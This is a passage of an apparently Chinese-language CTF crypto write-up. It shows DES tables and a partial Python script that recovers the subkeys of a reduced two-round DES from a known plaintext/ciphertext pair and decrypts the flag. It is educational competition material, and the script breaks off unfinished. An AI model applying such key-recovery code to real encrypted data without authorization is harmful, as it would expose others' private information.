class="number">8</span>, <span class="number">12</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">15</span>],</span><br><span class="line">        [<span class="number">13</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">11</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">14</span>, <span class="number">9</span>]</span><br><span class="line">    ],</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Box-3</span></span><br><span class="line"></span><br><span class="line">    [</span><br><span class="line">        [<span class="number">10</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">8</span>],</span><br><span class="line">        [<span class="number">13</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">14</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">15</span>, <span class="number">1</span>],</span><br><span class="line">        [<span class="number">13</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">15</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">7</span>],</span><br><span class="line">        [<span class="number">1</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">11</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">12</span>]</span><br><span class="line"></span><br><span class="line">    ],</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Box-4</span></span><br><span class="line">    [</span><br><span class="line">        [<span class="number">7</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">15</span>],</span><br><span class="line">        [<span class="number">13</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">9</span>],</span><br><span class="line">        [<span class="number">10</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">7</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">4</span>],</span><br><span class="line">        [<span class="number">3</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">14</span>]</span><br><span class="line">    ],</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Box-5</span></span><br><span class="line">    [</span><br><span class="line">        [<span class="number">2</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">9</span>],</span><br><span class="line">        [<span class="number">14</span>, <span class="number">11</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">10</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">6</span>],</span><br><span class="line">        [<span class="number">4</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">15</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">14</span>],</span><br><span class="line">        [<span class="number">11</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">13</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">3</span>]</span><br><span class="line">    ],</span><br><span class="line">    <span class="comment"># Box-6</span></span><br><span class="line"></span><br><span class="line">    [</span><br><span class="line">        [<span class="number">12</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">9</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">14</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">11</span>],</span><br><span class="line">        [<span class="number">10</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">8</span>],</span><br><span class="line">        [<span class="number">9</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">11</span>, <span class="number">6</span>],</span><br><span class="line">        [<span class="number">4</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">15</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">14</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">13</span>]</span><br><span class="line"></span><br><span class="line">    ],</span><br><span class="line">    <span class="comment"># Box-7</span></span><br><span class="line">    [</span><br><span class="line">        [<span class="number">4</span>, <span class="number">11</span>, <span class="number">2</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">3</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">1</span>],</span><br><span class="line">        [<span class="number">13</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">12</span>, <span class="number">2</span>, <span class="number">15</span>, <span class="number">8</span>, <span class="number">6</span>],</span><br><span class="line">        [<span class="number">1</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">14</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">2</span>],</span><br><span class="line">        [<span class="number">6</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">10</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">12</span>]</span><br><span class="line">    ],</span><br><span class="line">    <span class="comment"># Box-8</span></span><br><span class="line"></span><br><span class="line">    [</span><br><span class="line">        [<span class="number">13</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">11</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">7</span>],</span><br><span class="line">        [<span class="number">1</span>, <span class="number">15</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">9</span>, <span class="number">2</span>],</span><br><span class="line">        [<span class="number">7</span>, <span class="number">11</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">8</span>],</span><br><span class="line">        [<span class="number">2</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">10</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">11</span>]</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">]</span><br><span class="line">P = [<span class="number">16</span>, <span class="number">7</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">29</span>, <span class="number">12</span>, <span class="number">28</span>, <span class="number">17</span>, <span class="number">1</span>, <span class="number">15</span>, <span class="number">23</span>, <span class="number">26</span>, <span class="number">5</span>, <span class="number">18</span>, <span class="number">31</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">24</span>, <span class="number">14</span>, <span class="number">32</span>, <span class="number">27</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">19</span>, <span class="number">13</span>, <span class="number">30</span>, <span class="number">6</span>, <span class="number">22</span>, <span class="number">11</span>, <span class="number">4</span>,</span><br><span class="line">     <span class="number">25</span>]</span><br><span class="line">Inv_P = [<span class="number">9</span>, <span class="number">17</span>, <span class="number">23</span>, <span class="number">31</span>, <span class="number">13</span>, <span class="number">28</span>, <span class="number">2</span>, <span class="number">18</span>, <span class="number">24</span>, <span class="number">16</span>, <span class="number">30</span>, <span class="number">6</span>, <span class="number">26</span>, <span class="number">20</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">14</span>, <span class="number">25</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">29</span>, <span class="number">11</span>, <span class="number">19</span>, <span class="number">32</span>, <span class="number">12</span>, <span class="number">22</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">27</span>,</span><br><span class="line">         <span class="number">15</span>, <span class="number">21</span>]</span><br><span class="line"></span><br><span class="line">Inv_IP = [<span class="number">40</span>, <span class="number">8</span>, <span class="number">48</span>, <span class="number">16</span>, <span class="number">56</span>, <span class="number">24</span>, <span class="number">64</span>, <span class="number">32</span>, <span class="number">39</span>, <span class="number">7</span>, <span class="number">47</span>, <span class="number">15</span>, <span class="number">55</span>, <span class="number">23</span>, <span class="number">63</span>, <span class="number">31</span>, <span class="number">38</span>, <span class="number">6</span>, <span class="number">46</span>, <span class="number">14</span>, <span class="number">54</span>, <span class="number">22</span>, <span class="number">62</span>, <span class="number">30</span>, <span class="number">37</span>, <span class="number">5</span>, <span class="number">45</span>, <span class="number">13</span>,</span><br><span class="line">          <span class="number">53</span>, <span class="number">21</span>, <span class="number">61</span>, <span class="number">29</span>, <span class="number">36</span>, <span class="number">4</span>, <span class="number">44</span>, <span class="number">12</span>, <span class="number">52</span>, <span class="number">20</span>, <span class="number">60</span>, <span class="number">28</span>, <span class="number">35</span>, <span class="number">3</span>, <span class="number">43</span>, <span class="number">11</span>, <span class="number">51</span>, <span class="number">19</span>, <span class="number">59</span>, <span class="number">27</span>, <span class="number">34</span>, <span class="number">2</span>, <span class="number">42</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">18</span>, <span class="number">58</span>, <span class="number">26</span>,</span><br><span class="line">          <span class="number">33</span>, <span class="number">1</span>, <span class="number">41</span>, <span class="number">9</span>, <span class="number">49</span>, <span class="number">17</span>, <span class="number">57</span>, <span class="number">25</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inverse_table</span>(<span class="params">table</span>):</span></span><br><span class="line">    new = <span class="built_in">list</span>()</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(table)):</span><br><span class="line">        <span class="keyword">if</span> (x + <span class="number">1</span>) <span class="keyword">in</span> table:</span><br><span class="line">            num = table.index(x + <span class="number">1</span>) + <span class="number">1</span></span><br><span class="line">            new.append(num)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            new.append(x)</span><br><span class="line">    <span class="keyword">return</span> new</span><br></pre></td></tr></table></figure>

<p>听V神讲了一遍还是不懂，但看到尚师傅做出来了，燃起来了，复现的斗志</p>
<p>缩起来惭愧，虽然赛后稍微研究下了feistel和DES，但还是被<code>key_64 += &#39;&#123;0:04b&#125;&#39;.format(int(key[i], 16))</code>这句话劝退了，因为看不懂<code>&#123;0:04b&#125;</code>，觉得好复杂；还是很不应该，实在不懂，你比赛时输出来看下啊</p>
<p>后面查了下是用4位的二进制表示，1位16进制的用4位二进制表示也够了</p>
<p>所以痛定思痛，既然不懂，我尝试复现整个des流程，红色表示已知和可以直接倒推的部分，绿色表示需要爆破的地方，这下就清晰了吧</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/des.svg" alt="des"></p>
<p><em>我放的是矢量图，有兴趣指导指导的师傅可以浏览器打开链接下载下来看看（最后我发现其实没有必要画的这么详细，知道一个func就差不多了；但毕竟之前不懂吧，绕远路才是我最短的捷径）</em></p>
<p>整道题的思路就是用一组随机的key去加密了已知的<code>testtest</code>得到结果<code>77a35598c47aeea6</code>，并用相同的key去加密我们的flag；那么解题的思路也很明了了，通过已知的明密文设法得到key，然后写解密函数，最终返回到</p>
<p>先搞key1（图中的key1我随便写的），只需要关注上面那个feistel结构</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210820190413902.png" alt="image-20210820190413902"></p>
<p>有些是可以直接逆回去的部分，形如<code>inv_permutation</code>和<code>per_func</code>这两个函数，就可以这样逆回来，写的有点臭屁</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inv_permutation</span>(<span class="params">text</span>):</span></span><br><span class="line">    final = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> Inv_IP:</span><br><span class="line">        final += text[x - <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> final</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">per_func</span>(<span class="params">s_output</span>):</span></span><br><span class="line">    s_final = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> P:</span><br><span class="line">        s_final += s_output[x - <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> s_final</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">null = [<span class="string">&#x27;&#x27;</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>)]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">permutation</span>(<span class="params">plain_text</span>):</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(plain_text) == <span class="built_in">len</span>(Inv_IP)</span><br><span class="line">    final = null</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(Inv_IP)):</span><br><span class="line">        final[Inv_IP[x]-<span class="number">1</span>] = plain_text[x]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(final)</span><br></pre></td></tr></table></figure>

<p>然后本题最为关键的就是爆破这个sbox；关于sbox的工作原理，简单来说就是将48位转成32位，中间是每6位转8位，就如wiki百科上以sbox5为例，<code>011011</code>首尾是<code>01</code>，中间是<code>1101</code>，也就是对应坐标<code>1,13</code>，对应到沙盒（这个是可以查表的）就是<code>1001</code>。这样一顿操作下来，就把原来总长48位的，拆分成8个小组，每组6位变成4位，从而最后的总长度为32。显然这个过程是不可逆的</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210820204757956.png" alt="image-20210820204757956"></p>
<p>仔细观察沙盒发现一行中是<code>0~15</code>这16个数字打乱顺序，所以一个沙盒要爆破4种情况</p>
<p>写了下脚本，但感觉自己代码能力确实太差了啊，命名很成问题，最后有错误也检查不出来，后续再补</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> My_box <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">teststring = <span class="string">&quot;testtest&quot;</span></span><br><span class="line">cipher = <span class="number">0x77a35598c47aeea6</span></span><br><span class="line">final = <span class="built_in">bin</span>(cipher)[<span class="number">2</span>:].rjust(<span class="number">64</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">c = <span class="string">&#x27;86721c7c1ebe2d0af8aa8e073073931b4a5ae6dcf03c784e3c70b5f8ce71cf9eb87f9b836eea0118&#x27;</span></span><br><span class="line"></span><br><span class="line">null64 = [<span class="string">&#x27;&#x27;</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>)]</span><br><span class="line">null32 = [<span class="string">&#x27;&#x27;</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_permutation</span>(<span class="params">plain_text</span>):</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(plain_text) == <span class="built_in">len</span>(Inv_IP)</span><br><span class="line">    per_final = null64</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(Inv_IP)):</span><br><span class="line">        per_final[Inv_IP[x]-<span class="number">1</span>] = plain_text[x]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(per_final)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">expand</span>(<span class="params">text</span>):</span></span><br><span class="line">    temp = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> E:</span><br><span class="line">        temp += text[x - <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> temp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inv_per_func</span>(<span class="params">s_final</span>):</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(s_final) == <span class="built_in">len</span>(P)</span><br><span class="line">    s_output = null32</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(P)):</span><br><span class="line">        s_output[P[x] - <span class="number">1</span>] = s_final[x]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(s_output)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span>(<span class="params">text</span>):</span></span><br><span class="line">    exp = expand(text)</span><br><span class="line">    <span class="keyword">return</span> exp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_column</span>(<span class="params">num, index, row</span>):</span></span><br><span class="line">    <span class="keyword">for</span> find_j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        <span class="keyword">if</span> S[index][row][find_j] == num:</span><br><span class="line">            <span class="keyword">return</span> find_j</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">permutation</span>(<span class="params">plain_text</span>):</span></span><br><span class="line">    p = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> IP:</span><br><span class="line">        p += plain_text[x - <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">plain_text</span>):</span></span><br><span class="line">    plain_textb = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> en_i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        plain_textb += <span class="string">&#x27;&#123;0:04b&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">int</span>(plain_text[en_i], <span class="number">16</span>))</span><br><span class="line">    plain_textp = permutation(plain_textb)</span><br><span class="line">    en_left, en_right = plain_textp[:<span class="number">32</span>], plain_textp[<span class="number">32</span>:]</span><br><span class="line">    out = func(en_right)</span><br><span class="line">    <span class="keyword">return</span> en_left, en_right, out</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sbox</span>(<span class="params">s_input</span>):</span></span><br><span class="line">    s_out = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> sbox_i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        s_row = <span class="built_in">int</span>(s_input[<span class="number">6</span> * sbox_i] + s_input[<span class="number">6</span> * sbox_i + <span class="number">5</span>], <span class="number">2</span>)</span><br><span class="line">        s_column = <span class="built_in">int</span>(s_input[<span class="number">6</span> * sbox_i + <span class="number">1</span>:<span class="number">6</span> * sbox_i + <span class="number">5</span>], <span class="number">2</span>)</span><br><span class="line">        s_out += <span class="string">&#x27;&#123;0:04b&#125;&#x27;</span>.<span class="built_in">format</span>(S[sbox_i][s_row][s_column])</span><br><span class="line">    <span class="keyword">return</span> s_out</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">per_func</span>(<span class="params">s_output</span>):</span></span><br><span class="line">    s_final = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> P:</span><br><span class="line">        s_final += s_output[x - <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> s_final</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inv_permutation</span>(<span class="params">cipher_text</span>):</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(cipher_text) == <span class="built_in">len</span>(IP)</span><br><span class="line">    p = null64</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(IP)):</span><br><span class="line">        p[IP[x] - <span class="number">1</span>] = cipher_text[x]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(p)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">cipher_text, d_sub_keys</span>):</span></span><br><span class="line">    d_final = <span class="built_in">bin</span>(<span class="built_in">int</span>(cipher_text, <span class="number">16</span>))[<span class="number">2</span>:].rjust(<span class="number">64</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    d_final = my_permutation(d_final)</span><br><span class="line">    d_left, d_right = d_final[:<span class="number">32</span>], d_final[<span class="number">32</span>:]</span><br><span class="line">    <span class="comment"># RIGHT</span></span><br><span class="line">    d_EXP = func(d_left)</span><br><span class="line">    <span class="comment"># inv_func</span></span><br><span class="line">    d_s_input = <span class="string">&#x27;&#123;0:048b&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">int</span>(d_EXP, <span class="number">2</span>) ^ <span class="built_in">int</span>(d_sub_keys[<span class="number">1</span>], <span class="number">2</span>))</span><br><span class="line">    d_s_out = sbox(d_s_input)</span><br><span class="line">    out = per_func(d_s_out)</span><br><span class="line"></span><br><span class="line">    d_RIGHT = <span class="built_in">bin</span>(<span class="built_in">int</span>(out, <span class="number">2</span>) ^ <span class="built_in">int</span>(d_right, <span class="number">2</span>))[<span class="number">2</span>:].rjust(<span class="number">32</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># LEFT</span></span><br><span class="line">    d_EXP = func(d_RIGHT)</span><br><span class="line">    d_s_input = <span class="string">&#x27;&#123;0:048b&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">int</span>(d_EXP, <span class="number">2</span>) ^ <span class="built_in">int</span>(d_sub_keys[<span class="number">0</span>], <span class="number">2</span>))</span><br><span class="line">    d_s_out = sbox(d_s_input)</span><br><span class="line">    out = per_func(d_s_out)</span><br><span class="line"></span><br><span class="line">    d_LEFT = <span class="built_in">bin</span>(<span class="built_in">int</span>(out, <span class="number">2</span>) ^ <span class="built_in">int</span>(d_left, <span class="number">2</span>))[<span class="number">2</span>:].rjust(<span class="number">32</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    plaintext = d_LEFT + d_RIGHT</span><br><span class="line">    plaintext = inv_permutation(plaintext)</span><br><span class="line">    plaintext = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">hex</span>(<span class="built_in">int</span>(plaintext[_:_+<span class="number">4</span>], <span class="number">2</span>))[<span class="number">2</span>:] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(plaintext), <span class="number">4</span>))</span><br><span class="line">    <span class="keyword">return</span> plaintext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inv_rjust</span>(<span class="params">cipher_text</span>):</span></span><br><span class="line">    <span class="keyword">for</span> rjust_i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cipher_text)):</span><br><span class="line">        <span class="keyword">if</span> cipher_text[rjust_i] != <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> cipher_text[rjust_i:]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inv_pad</span>(<span class="params">cipher_text</span>):</span></span><br><span class="line">    <span class="keyword">for</span> pad_i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cipher_text)-<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> cipher_text[pad_i] != <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> cipher_text[:pad_i]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mydec</span>(<span class="params">ciphertext, d_sub_keys</span>):</span></span><br><span class="line">    plaintext = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> de_i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(ciphertext), <span class="number">16</span>):</span><br><span class="line">        block_enc = inv_rjust(ciphertext[de_i:de_i + <span class="number">16</span>])</span><br><span class="line">        block = decrypt(block_enc, d_sub_keys)</span><br><span class="line">        plaintext += block</span><br><span class="line">    plaintext = inv_pad(plaintext)</span><br><span class="line">    <span class="keyword">return</span> plaintext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">LEFT, RIGHT, EXP1 = encrypt(teststring.encode().<span class="built_in">hex</span>())</span><br><span class="line">final = my_permutation(final)</span><br><span class="line">left, right = final[:<span class="number">32</span>], final[<span class="number">32</span>:]</span><br><span class="line">EXP2 = func(left)</span><br><span class="line"></span><br><span class="line"><span class="comment"># key1</span></span><br><span class="line">f_final1 = <span class="built_in">bin</span>(<span class="built_in">int</span>(left, <span class="number">2</span>) ^ <span class="built_in">int</span>(LEFT, <span class="number">2</span>))[<span class="number">2</span>:].rjust(<span class="number">32</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"><span class="comment"># 